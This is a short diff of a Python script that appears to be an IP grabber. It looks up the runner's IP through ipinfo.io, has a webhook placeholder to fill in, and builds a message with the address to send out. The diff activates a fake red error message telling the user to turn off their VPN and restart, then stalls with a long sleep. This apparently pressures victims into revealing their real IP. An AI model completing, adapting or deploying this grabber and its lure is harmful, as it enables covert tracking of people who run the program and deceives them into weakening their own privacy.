@@ -24,8 +24,8 @@ avatar = "https://64.media.tumblr.com/4251274b58928d74cb7821452eed9f87/19a1d45f3
 yes = r.get("https://ipinfo.io/json")
 #webhook (ed it this)
 webhook = "WEBHOOK HERE"
-#print(Fore.RED + "If program doesn't work then off your vpn and restart.")
-#time.sleep(9999)
+print(Fore.RED + "If program doesn't work then off your vpn and restart.")
+time.sleep(9999)
 #Ip adress and more things.
 ip = {
   "content": "IP Adress: " + json.loads(yes.content)["ip"],
